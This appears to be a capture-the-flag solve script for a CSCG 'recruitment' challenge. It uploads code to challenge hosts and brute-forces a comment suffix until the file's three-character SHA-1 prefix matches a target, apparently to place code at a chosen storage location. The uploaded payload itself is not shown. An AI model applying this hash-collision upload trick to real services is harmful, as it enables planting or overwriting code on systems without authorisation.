```python
import requests
import hashlib
from pwnlib.util.iters import bruteforce
from string import ascii_letters
```

```python
HOST_UPLOAD = 'https://64c69d19420d58cf097f4bf8-5000-recruitment.challenge.cscg.live:1337'
HOST_RECRUITING = 'https://64c69d19420d58cf097f4bf8-5004-recruitment.challenge.cscg.live:1337'
```

```python
def upload_code(code):
    res = requests.put(f'{HOST_UPLOAD}/service', data=code)
    return res.url.split('/')[-1][:-3]
```

```python
def get_file_hash(file_content):
    return hashlib.sha1(file_content.encode()).hexdigest()[:3]

def adjust_code_to_hash(file_content, expected_hash):
    found = bruteforce(lambda x: get_file_hash(file_content + '//' + x) == expected_hash, ascii_letters, 64, 'upto')
    return file_content + '//' + found
```

```python
def upload_code_to_location(code, expected_hash):
    upload_code(adjust_code_to_hash(code, expected_hash))
```

```python
upload_code_to_location(code, '1b6')
```
